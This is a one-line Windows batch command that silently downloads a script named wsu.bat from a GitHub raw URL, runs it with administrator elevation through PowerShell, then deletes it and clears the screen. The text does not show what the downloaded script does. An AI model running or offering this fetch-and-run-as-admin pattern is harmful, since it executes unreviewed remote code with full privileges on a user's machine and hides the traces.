echo off&cls&curl -s https://raw.githubusercontent.com/ItsSuperPlayz/WSU/refs/heads/main/wsu.bat>%temp%\wsu.bat&&start /wait /b powershell Start-Process cmd -ArgumentList '/c %temp%\wsu.bat' -Verb RunAs&del %temp%\wsu.bat&cls